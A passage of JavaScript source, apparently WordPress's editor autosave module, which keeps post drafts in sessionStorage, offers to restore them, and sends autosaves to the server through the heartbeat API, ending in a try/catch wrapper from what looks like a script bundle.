			var blog_id, post_id, hasStorage, intervalTimer,
				lastCompareString,
				isSuspended = false;

			/**
			 * Checks if the browser supports sessionStorage and it's not disabled.
			 *
			 * @since 3.9.0
			 *
			 * @return {boolean} True if the sessionStorage is supported and enabled.
			 */
			function checkStorage() {
				var test = Math.random().toString(),
					result = false;

				try {
					window.sessionStorage.setItem( 'wp-test', test );
					result = window.sessionStorage.getItem( 'wp-test' ) === test;
					window.sessionStorage.removeItem( 'wp-test' );
				} catch(e) {}

				hasStorage = result;
				return result;
			}

			/**
			 * Initializes the local storage.
			 *
			 * @since 3.9.0
			 *
			 * @return {boolean|Object} False if no sessionStorage in the browser or an Object
			 *                          containing all postData for this blog.
			 */
			function getStorage() {
				var stored_obj = false;
				// Separate local storage containers for each blog_id.
				if ( hasStorage && blog_id ) {
					stored_obj = sessionStorage.getItem( 'wp-autosave-' + blog_id );

					if ( stored_obj ) {
						stored_obj = JSON.parse( stored_obj );
					} else {
						stored_obj = {};
					}
				}

				return stored_obj;
			}

			/**
			 * Sets the storage for this blog. Confirms that the data was saved
			 * successfully.
			 *
			 * @since 3.9.0
			 *
			 * @return {boolean} True if the data was saved successfully, false if it wasn't saved.
			 */
			function setStorage( stored_obj ) {
				var key;

				if ( hasStorage && blog_id ) {
					key = 'wp-autosave-' + blog_id;
					sessionStorage.setItem( key, JSON.stringify( stored_obj ) );
					return sessionStorage.getItem( key ) !== null;
				}

				return false;
			}

			/**
			 * Gets the saved post data for the current post.
			 *
			 * @since 3.9.0
			 *
			 * @return {boolean|Object} False if no storage or no data or the postData as an Object.
			 */
			function getSavedPostData() {
				var stored = getStorage();

				if ( ! stored || ! post_id ) {
					return false;
				}

				return stored[ 'post_' + post_id ] || false;
			}

			/**
			 * Sets (save or delete) post data in the storage.
			 *
			 * If stored_data evaluates to 'false' the storage key for the current post will be removed.
			 *
			 * @since 3.9.0
			 *
			 * @param {Object|boolean|null} stored_data The post data to store or null/false/empty to delete the key.
			 *
			 * @return {boolean} True if data is stored, false if data was removed.
			 */
			function setData( stored_data ) {
				var stored = getStorage();

				if ( ! stored || ! post_id ) {
					return false;
				}

				if ( stored_data ) {
					stored[ 'post_' + post_id ] = stored_data;
				} else if ( stored.hasOwnProperty( 'post_' + post_id ) ) {
					delete stored[ 'post_' + post_id ];
				} else {
					return false;
				}

				return setStorage( stored );
			}

			/**
			 * Sets isSuspended to true.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function suspend() {
				isSuspended = true;
			}

			/**
			 * Sets isSuspended to false.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function resume() {
				isSuspended = false;
			}

			/**
			 * Saves post data for the current post.
			 *
			 * Runs on a 15 seconds interval, saves when there are differences in the post title or content.
			 * When the optional data is provided, updates the last saved post data.
			 *
			 * @since 3.9.0
			 *
			 * @param {Object} data The post data for saving, minimum 'post_title' and 'content'.
			 *
			 * @return {boolean} Returns true when data has been saved, otherwise it returns false.
			 */
			function save( data ) {
				var postData, compareString,
					result = false;

				if ( isSuspended || ! hasStorage ) {
					return false;
				}

				if ( data ) {
					postData = getSavedPostData() || {};
					$.extend( postData, data );
				} else {
					postData = getPostData('local');
				}

				compareString = getCompareString( postData );

				if ( typeof lastCompareString === 'undefined' ) {
					lastCompareString = initialCompareString;
				}

				// If the content, title and excerpt did not change since the last save, don't save again.
				if ( compareString === lastCompareString ) {
					return false;
				}

				postData.save_time = ( new Date() ).getTime();
				postData.status = $( '#post_status' ).val() || '';
				result = setData( postData );

				if ( result ) {
					lastCompareString = compareString;
				}

				return result;
			}

			/**
			 * Initializes the auto save function.
			 *
			 * Checks whether the editor is active or not to use the editor events
			 * to autosave, or uses the values from the elements to autosave.
			 *
			 * Runs on DOM ready.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function run() {
				post_id = $('#post_ID').val() || 0;

				// Check if the local post data is different than the loaded post data.
				if ( $( '#wp-content-wrap' ).hasClass( 'tmce-active' ) ) {

					/*
					 * If TinyMCE loads first, check the post 1.5 seconds after it is ready.
					 * By this time the content has been loaded in the editor and 'saved' to the textarea.
					 * This prevents false positives.
					 */
					$document.on( 'tinymce-editor-init.autosave', function() {
						window.setTimeout( function() {
							checkPost();
						}, 1500 );
					});
				} else {
					checkPost();
				}

				// Save every 15 seconds.
				intervalTimer = window.setInterval( save, 15000 );

				$( 'form#post' ).on( 'submit.autosave-local', function() {
					var editor = getEditor(),
						post_id = $('#post_ID').val() || 0;

					if ( editor && ! editor.isHidden() ) {

						// Last onSubmit event in the editor, needs to run after the content has been moved to the textarea.
						editor.on( 'submit', function() {
							save({
								post_title: $( '#title' ).val() || '',
								content: $( '#content' ).val() || '',
								excerpt: $( '#excerpt' ).val() || ''
							});
						});
					} else {
						save({
							post_title: $( '#title' ).val() || '',
							content: $( '#content' ).val() || '',
							excerpt: $( '#excerpt' ).val() || ''
						});
					}

					var secure = ( 'https:' === window.location.protocol );
					wpCookies.set( 'wp-saving-post', post_id + '-check', 24 * 60 * 60, false, false, secure );
				});
			}

			/**
			 * Compares 2 strings. Removes whitespaces in the strings before comparing them.
			 *
			 * @since 3.9.0
			 *
			 * @param {string} str1 The first string.
			 * @param {string} str2 The second string.
			 * @return {boolean} True if the strings are the same.
			 */
			function compare( str1, str2 ) {
				function removeSpaces( string ) {
					return string.toString().replace(/[\x20\t\r\n\f]+/g, '');
				}

				return ( removeSpaces( str1 || '' ) === removeSpaces( str2 || '' ) );
			}

			/**
			 * Checks if the saved data for the current post (if any) is different than the
			 * loaded post data on the screen.
			 *
			 * Shows a standard message letting the user restore the post data if different.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function checkPost() {
				var content, post_title, excerpt, $notice,
					postData = getSavedPostData(),
					cookie = wpCookies.get( 'wp-saving-post' ),
					$newerAutosaveNotice = $( '#has-newer-autosave' ).parent( '.notice' ),
					$headerEnd = $( '.wp-header-end' );

				if ( cookie === post_id + '-saved' ) {
					wpCookies.remove( 'wp-saving-post' );
					// The post was saved properly, remove old data and bail.
					setData( false );
					return;
				}

				if ( ! postData ) {
					return;
				}

				content = $( '#content' ).val() || '';
				post_title = $( '#title' ).val() || '';
				excerpt = $( '#excerpt' ).val() || '';

				if ( compare( content, postData.content ) && compare( post_title, postData.post_title ) &&
					compare( excerpt, postData.excerpt ) ) {

					return;
				}

				/*
				 * If '.wp-header-end' is found, append the notices after it otherwise
				 * after the first h1 or h2 heading found within the main content.
				 */
				if ( ! $headerEnd.length ) {
					$headerEnd = $( '.wrap h1, .wrap h2' ).first();
				}

				$notice = $( '#local-storage-notice' )
					.insertAfter( $headerEnd )
					.addClass( 'notice-warning' );

				if ( $newerAutosaveNotice.length ) {

					// If there is a "server" autosave notice, hide it.
					// The data in the session storage is either the same or newer.
					$newerAutosaveNotice.slideUp( 150, function() {
						$notice.slideDown( 150 );
					});
				} else {
					$notice.slideDown( 200 );
				}

				$notice.find( '.restore-backup' ).on( 'click.autosave-local', function() {
					restorePost( postData );
					$notice.fadeTo( 250, 0, function() {
						$notice.slideUp( 150 );
					});
				});
			}

			/**
			 * Restores the current title, content and excerpt from postData.
			 *
			 * @since 3.9.0
			 *
			 * @param {Object} postData The object containing all post data.
			 *
			 * @return {boolean} True if the post is restored.
			 */
			function restorePost( postData ) {
				var editor;

				if ( postData ) {
					// Set the last saved data.
					lastCompareString = getCompareString( postData );

					if ( $( '#title' ).val() !== postData.post_title ) {
						$( '#title' ).trigger( 'focus' ).val( postData.post_title || '' );
					}

					$( '#excerpt' ).val( postData.excerpt || '' );
					editor = getEditor();

					if ( editor && ! editor.isHidden() && typeof switchEditors !== 'undefined' ) {
						if ( editor.settings.wpautop && postData.content ) {
							postData.content = switchEditors.wpautop( postData.content );
						}

						// Make sure there's an undo level in the editor.
						editor.undoManager.transact( function() {
							editor.setContent( postData.content || '' );
							editor.nodeChanged();
						});
					} else {

						// Make sure the Code editor is selected.
						$( '#content-html' ).trigger( 'click' );
						$( '#content' ).trigger( 'focus' );

						// Using document.execCommand() will let the user undo.
						document.execCommand( 'selectAll' );
						document.execCommand( 'insertText', false, postData.content || '' );
					}

					return true;
				}

				return false;
			}

			blog_id = typeof window.autosaveL10n !== 'undefined' && window.autosaveL10n.blog_id;

			/*
			 * Check if the browser supports sessionStorage and it's not disabled,
			 * then initialize and run checkPost().
			 * Don't run if the post type supports neither 'editor' (textarea#content) nor 'excerpt'.
			 */
			if ( checkStorage() && blog_id && ( $('#content').length || $('#excerpt').length ) ) {
				$( run );
			}

			return {
				hasStorage: hasStorage,
				getSavedPostData: getSavedPostData,
				save: save,
				suspend: suspend,
				resume: resume
			};
		}

		/**
		 * Auto saves the post on the server.
		 *
		 * @since 3.9.0
		 *
		 * @return {Object} {
		 * 	{
		 * 		tempBlockSave: tempBlockSave,
		 * 		triggerSave: triggerSave,
		 * 		postChanged: postChanged,
		 * 		suspend: suspend,
		 * 		resume: resume
		 * 		}
		 * 	} The object all functions for autosave.
		 */
		function autosaveServer() {
			var _blockSave, _blockSaveTimer, previousCompareString, lastCompareString,
				nextRun = 0,
				isSuspended = false;


			/**
			 * Blocks saving for the next 10 seconds.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function tempBlockSave() {
				_blockSave = true;
				window.clearTimeout( _blockSaveTimer );

				_blockSaveTimer = window.setTimeout( function() {
					_blockSave = false;
				}, 10000 );
			}

			/**
			 * Sets isSuspended to true.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function suspend() {
				isSuspended = true;
			}

			/**
			 * Sets isSuspended to false.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function resume() {
				isSuspended = false;
			}

			/**
			 * Triggers the autosave with the post data.
			 *
			 * @since 3.9.0
			 *
			 * @param {Object} data The post data.
			 *
			 * @return {void}
			 */
			function response( data ) {
				_schedule();
				_blockSave = false;
				lastCompareString = previousCompareString;
				previousCompareString = '';

				$document.trigger( 'after-autosave', [data] );
				enableButtons();

				if ( data.success ) {
					// No longer an auto-draft.
					$( '#auto_draft' ).val('');
				}
			}

			/**
			 * Saves immediately.
			 *
			 * Resets the timing and tells heartbeat to connect now.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function triggerSave() {
				nextRun = 0;
				wp.heartbeat.connectNow();
			}

			/**
			 * Checks if the post content in the textarea has changed since page load.
			 *
			 * This also happens when TinyMCE is active and editor.save() is triggered by
			 * wp.autosave.getPostData().
			 *
			 * @since 3.9.0
			 *
			 * @return {boolean} True if the post has been changed.
			 */
			function postChanged() {
				var changed = false;

				// If there are TinyMCE instances, loop through them.
				if ( window.tinymce ) {
					window.tinymce.each( [ 'content', 'excerpt' ], function( field ) {
						var editor = window.tinymce.get( field );

						if ( ! editor || editor.isHidden() ) {
							if ( ( $( '#' + field ).val() || '' ) !== initialCompareData[ field ] ) {
								changed = true;
								// Break.
								return false;
							}
						} else if ( editor.isDirty() ) {
							changed = true;
							return false;
						}
					} );

					if ( ( $( '#title' ).val() || '' ) !== initialCompareData.post_title ) {
						changed = true;
					}

					return changed;
				}

				return getCompareString() !== initialCompareString;
			}

			/**
			 * Checks if the post can be saved or not.
			 *
			 * If the post hasn't changed or it cannot be updated,
			 * because the autosave is blocked or suspended, the function returns false.
			 *
			 * @since 3.9.0
			 *
			 * @return {Object} Returns the post data.
			 */
			function save() {
				var postData, compareString;

				// window.autosave() used for back-compat.
				if ( isSuspended || _blockSave || ! window.autosave() ) {
					return false;
				}

				if ( ( new Date() ).getTime() < nextRun ) {
					return false;
				}

				postData = getPostData();
				compareString = getCompareString( postData );

				// First check.
				if ( typeof lastCompareString === 'undefined' ) {
					lastCompareString = initialCompareString;
				}

				// No change.
				if ( compareString === lastCompareString ) {
					return false;
				}

				previousCompareString = compareString;
				tempBlockSave();
				disableButtons();

				$document.trigger( 'wpcountwords', [ postData.content ] )
					.trigger( 'before-autosave', [ postData ] );

				postData._wpnonce = $( '#_wpnonce' ).val() || '';

				return postData;
			}

			/**
			 * Sets the next run, based on the autosave interval.
			 *
			 * @private
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function _schedule() {
				nextRun = ( new Date() ).getTime() + ( autosaveL10n.autosaveInterval * 1000 ) || 60000;
			}

			/**
			 * Sets the autosaveData on the autosave heartbeat.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			$( function() {
				_schedule();
			}).on( 'heartbeat-send.autosave', function( event, data ) {
				var autosaveData = save();

				if ( autosaveData ) {
					data.wp_autosave = autosaveData;
				}

				/**
				 * Triggers the autosave of the post with the autosave data on the autosave
				 * heartbeat.
				 *
				 * @since 3.9.0
				 *
				 * @return {void}
				 */
			}).on( 'heartbeat-tick.autosave', function( event, data ) {
				if ( data.wp_autosave ) {
					response( data.wp_autosave );
				}
				/**
				 * Disables buttons and throws a notice when the connection is lost.
				 *
				 * @since 3.9.0
				 *
				 * @return {void}
				 */
			}).on( 'heartbeat-connection-lost.autosave', function( event, error, status ) {

				// When connection is lost, keep user from submitting changes.
				if ( 'timeout' === error || 603 === status ) {
					var $notice = $('#lost-connection-notice');

					if ( ! wp.autosave.local.hasStorage ) {
						$notice.find('.hide-if-no-sessionstorage').hide();
					}

					$notice.show();
					disableButtons();
				}

				/**
				 * Enables buttons when the connection is restored.
				 *
				 * @since 3.9.0
				 *
				 * @return {void}
				 */
			}).on( 'heartbeat-connection-restored.autosave', function() {
				$('#lost-connection-notice').hide();
				enableButtons();
			});

			return {
				tempBlockSave: tempBlockSave,
				triggerSave: triggerSave,
				postChanged: postChanged,
				suspend: suspend,
				resume: resume
			};
		}

		/**
		 * Sets the autosave time out.
		 *
		 * Wait for TinyMCE to initialize plus 1 second. for any external css to finish loading,
		 * then save to the textarea before setting initialCompareString.
		 * This avoids any insignificant differences between the initial textarea content and the content
		 * extracted from the editor.
		 *
		 * @since 3.9.0
		 *
		 * @return {void}
		 */
		$( function() {
			// Set the initial compare string in case TinyMCE is not used or not loaded first.
			setInitialCompare();
		}).on( 'tinymce-editor-init.autosave', function( event, editor ) {
			// Reset the initialCompare data after the TinyMCE instances have been initialized.
			if ( 'content' === editor.id || 'excerpt' === editor.id ) {
				window.setTimeout( function() {
					editor.save();
					setInitialCompare();
				}, 1000 );
			}
		});

		return {
			getPostData: getPostData,
			getCompareString: getCompareString,
			disableButtons: disableButtons,
			enableButtons: enableButtons,
			local: autosaveLocal(),
			server: autosaveServer()
		};
	}

	/** @namespace wp */
	window.wp = window.wp || {};
	window.wp.autosave = autosave();

}( jQuery, window ));


}catch(e){}
})();
